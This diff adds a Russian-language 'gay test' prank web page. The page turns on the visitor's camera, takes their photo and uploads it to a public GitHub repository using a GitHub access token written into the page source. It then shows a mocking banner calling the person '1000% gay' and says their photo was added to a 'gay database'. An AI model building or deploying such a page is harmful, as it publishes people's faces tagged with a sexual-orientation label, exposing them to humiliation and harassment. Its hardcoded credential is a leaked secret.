@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Проверка на гея 1000%</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #ff0000 0%, #ff6b6b 50%, #ff8e8e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #fff;
+        }
+        
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 600px;
+            padding: 30px;
+            text-align: center;
+            border: 3px solid #ff0000;
+        }
+        
+        h1 {
+            color: #ff0000;
+            margin-bottom: 20px;
+            font-size: 32px;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        }
+        
+        p {
+            margin-bottom: 20px;
+            line-height: 1.6;
+            color: #fff;
+        }
+        
+        .camera-container {
+            width: 100%;
+            margin: 20px 0;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            position: relative;
+        }
+        
+        #video {
+            width: 100%;
+            display: block;
+            background: #000;
+            transform: scaleX(-1);
+        }
+        
+        #photo {
+            width: 100%;
+            display: none;
+            border-radius: 10px;
+            transform: scaleX(-1);
+            border: 3px solid #ff0000;
+        }
+        
+        .button {
+            background: linear-gradient(to right, #ff0000 0%, #ff6b6b 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 15px 0;
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3);
+            font-weight: bold;
+        }
+        
+        .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 0, 0, 0.5);
+            background: linear-gradient(to right, #ff6b6b 0%, #ff0000 100%);
+        }
+        
+        .button:active {
+            transform: translateY(1px);
+        }
+        
+        .button:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        .result {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(255, 0, 0, 0.2);
+            border-radius: 10px;
+            animation: dangerPulse 2s infinite;
+            border: 2px solid #ff0000;
+        }
+        
+        @keyframes dangerPulse {
+            0% { box-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
+            50% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.8); }
+            100% { box-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
+        }
+        
+        .result h2 {
+            color: #ff0000;
+            margin-bottom: 10px;
+            font-size: 28px;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        }
+        
+        .gay-percentage {
+            font-size: 40px;
+            font-weight: bold;
+            color: #ff0000;
+            text-shadow: 0 0 15px rgba(255, 0, 0, 0.8);
+            margin: 15px 0;
+            animation: textPulse 1s infinite;
+        }
+        
+        @keyframes textPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .warning {
+            color: #ff9900;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .config-panel {
+            background: rgba(255, 0, 0, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: left;
+            border: 1px solid #ff0000;
+        }
+        
+        .config-panel h3 {
+            margin-bottom: 10px;
+            color: #ff0000;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: 1px solid #ff0000;
+        }
+        
+        input[type="text"]::placeholder {
+            color: #ccc;
+        }
+        
+        .status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+        
+        .success {
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+        }
+        
+        .error {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff0000;
+            color: #ff0000;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #aaa;
+        }
+        
+        .loading {
+            display: none;
+            margin: 15px 0;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #ff0000;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .danger-icon {
+            font-size: 50px;
+            color: #ff0000;
+            margin: 10px 0;
+            animation: rotate 2s infinite;
+        }
+        
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            25% { transform: rotate(10deg); }
+            50% { transform: rotate(0deg); }
+            75% { transform: rotate(-10deg); }
+            100% { transform: rotate(0deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔞 ПРОВЕРКА НА ГЕЯ 🔞</h1>
+        
+        <div class="config-panel">
+            <h3>Настройки GitHub (уже заполнены)</h3>
+            <input type="text" id="githubToken" placeholder="GitHub Personal Access Token" value="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" readonly>
+            <input type="text" id="repoName" placeholder="Имя репозитория (username/repo)" value="wholovelyflick/GAY" readonly>
+            <input type="text" id="folderPath" placeholder="Путь к папке (например: photos/)" value="photos/">
+        </div>
+        
+        <p>ВНИМАНИЕ: система определяет геев с точностью 1000%! После проверки фото сохраняется в базе!</p>
+        
+        <div class="camera-container">
+            <video id="video" autoplay playsinline>Ваш браузер не поддерживает доступ к камере</video>
+            <canvas id="canvas" class="hidden"></canvas>
+            <img id="photo" alt="Ваше фото">
+        </div>
+        
+        <button id="enableCamera" class="button">✅ РАЗРЕШИТЬ ДОСТУП К КАМЕРЕ</button>
+        <button id="capture" class="button" disabled>🔍 ПРОВЕРИТЬ СЕБЯ НА ГЕЯ</button>
+        
+        <div class="loading">
+            <div class="spinner"></div>
+            <p>Анализируем фото... Ищем признаки гея...</p>
+        </div>
+        
+        <div id="result" class="result">
+            <div class="danger-icon">⚠️</div>
+            <h2>ОПАСНОСТЬ! ОБНАРУЖЕН ГЕЙ!</h2>
+            <div class="gay-percentage">1000% ГЕЙ</div>
+            <p class="warning">⚠️ Наша система AI обнаружила явные признаки гомосексуализма!</p>
+            <p>Фото добавлено в базу данных геев</p>
+            <p>Рекомендуется срочно пройти тест на гетеросексуальность</p>
+        </div>
+        
+        <div id="status" class="status"></div>
+        
+        <div class="footer">
+            <p>Фото сохраняются в репозиторий: wholovelyflick/GAY в папку photos/</p>
+            <p>Внимание: это всего лишь шуточный тест и не имеет научного обоснования</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const photo = document.getElementById('photo');
+            const captureButton = document.getElementById('capture');
+            const enableCameraButton = document.getElementById('enableCamera');
+            const statusDiv = document.getElementById('status');
+            const loadingDiv = document.querySelector('.loading');
+            const resultDiv = document.getElementById('result');
+            const githubTokenInput = document.getElementById('githubToken');
+            const repoNameInput = document.getElementById('repoName');
+            const folderPathInput = document.getElementById('folderPath');
+            
+            let stream = null;
+            
+            // Функция для запроса доступа к камере
+            async function setupCamera() {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: "user" 
+                        }, 
+                        audio: false 
+                    });
+                    
+                    video.srcObject = stream;
+                    captureButton.disabled = false;
+                    enableCameraButton.disabled = true;
+                    enableCameraButton.textContent = "КАМЕРА ПОДКЛЮЧЕНА";
+                    
+                } catch (err) {
+                    console.error("Ошибка при доступе к камере:", err);
+                    showStatus("Не удалось получить доступ к камере. Пожалуйста, проверьте настройки разрешений.", "error");
+                }
+            }
+            
+            // Функция для создания фотографии
+            function takePicture() {
+                const context = canvas.getContext('2d');
+                
+                // Устанавливаем размеры canvas как у видео
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Рисуем текущий кадр видео на canvas (зеркально для фронтальной камеры)
+                context.translate(canvas.width, 0);
+                context.scale(-1, 1);
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                context.setTransform(1, 0, 0, 1, 0, 0); // Сбрасываем трансформацию
+                
+                // Преобразуем canvas в data URL и устанавливаем как источник изображения
+                const data = canvas.toDataURL('image/jpeg', 0.8);
+                photo.src = data;
+                photo.style.display = 'block';
+                video.style.display = 'none';
+                
+                // Показываем результат проверки
+                resultDiv.style.display = 'block';
+                
+                return data;
+            }
+            
+            // Функция для отправки фото на GitHub
+            async function uploadToGitHub(imageData) {
+                const githubToken = githubTokenInput.value.trim();
+                const repoName = repoNameInput.value.trim();
+                const folderPath = folderPathInput.value.trim();
+                
+                if (!githubToken || !repoName) {
+                    showStatus("Ошибка: не указаны данные GitHub", "error");
+                    return;
+                }
+                
+                // Создаем имя файла на основе текущей даты и времени
+                const now = new Date();
+                const fileName = `gay_test_${now.getFullYear()}${(now.getMonth()+1).toString().padStart(2, '0')}${now.getDate().toString().padStart(2, '0')}_${now.getHours().toString().padStart(2, '0')}${now.getMinutes().toString().padStart(2, '0')}${now.getSeconds().toString().padStart(2, '0')}.jpg`;
+                const fullPath = folderPath ? `${folderPath}${fileName}` : fileName;
+                
+                // Конвертируем data URL в blob
+                const blob = dataURLtoBlob(imageData);
+                
+                // Читаем blob как массив байтов
+                const arrayBuffer = await blob.arrayBuffer();
+                const content = arrayBufferToBase64(arrayBuffer);
+                
+                // Формируем URL для API GitHub
+                const apiUrl = `https://api.github.com/repos/${repoName}/contents/${fullPath}`;
+                
+                // Подготавливаем данные для отправки
+                const commitMessage = `Добавлено фото проверки на гея: ${fileName}`;
+                const requestData = {
+                    message: commitMessage,
+                    content: content,
+                    branch: 'main'
+                };
+                
+                try {
+                    loadingDiv.style.display = 'block';
+                    captureButton.disabled = true;
+                    
+                    // Отправляем запрос к GitHub API
+                    const response = await fetch(apiUrl, {
+                        method: 'PUT',
+                        headers: {
+                            'Authorization': `token ${githubToken}`,
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(requestData)
+                    });
+                    
+                    const result = await response.json();
+                    
+                    if (response.ok) {
+                        showStatus(`Фото успешно сохранено в базе геев! Файл: ${fileName}`, "success");
+                        
+                        // Ссылка на файл в репозитории
+                        const fileUrl = result.content.html_url;
+                        statusDiv.innerHTML += `<br><a href="${fileUrl}" target="_blank" style="color: #ff0000;">Посмотреть доказательство на GitHub</a>`;
+                    } else {
+                        console.error('Ошибка при загрузке на GitHub:', result);
+                        showStatus(`Ошибка при сохранении: ${result.message}`, "error");
+                    }
+                } catch (error) {
+                    console.error('Ошибка при загрузке на GitHub:', error);
+                    showStatus(`Ошибка при сохранении: ${error.message}`, "error");
+                } finally {
+                    loadingDiv.style.display = 'none';
+                    captureButton.disabled = false;
+                }
+            }
+            
+            // Вспомогательная функция для конвертации Data URL в Blob
+            function dataURLtoBlob(dataurl) {
+                const arr = dataurl.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                let n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                while (n--) {
+                    u8arr[n] = bstr.charCodeAt(n);
+                }
+                return new Blob([u8arr], {type: mime});
+            }
+            
+            // Вспомогательная функция для конвертации ArrayBuffer в Base64
+            function arrayBufferToBase64(buffer) {
+                let binary = '';
+                const bytes = new Uint8Array(buffer);
+                const len = bytes.byteLength;
+                for (let i = 0; i < len; i++) {
+                    binary += String.fromCharCode(bytes[i]);
+                }
+                return btoa(binary);
+            }
+            
+            // Функция для отображения статуса
+            function showStatus(message, type) {
+                statusDiv.textContent = message;
+                statusDiv.className = 'status ' + type;
+                statusDiv.style.display = 'block';
+            }
+            
+            // Обработчики событий для кнопок
+            enableCameraButton.addEventListener('click', setupCamera);
+            
+            captureButton.addEventListener('click', async function() {
+                const imageData = takePicture();
+                await uploadToGitHub(imageData);
+            });
+        });
+    </script>
+</body>
+</html>
